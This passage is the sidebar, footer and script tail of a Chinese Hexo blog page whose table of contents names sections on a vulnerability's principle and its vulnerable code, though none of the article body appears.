class="nav-link" href="#%E9%99%84%E5%8A%A0%E7%94%A8java%E5%B7%A5%E5%85%B7"><span class="nav-number">2.2.8.</span> <span class="nav-text">附加用java工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞点代码分析</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>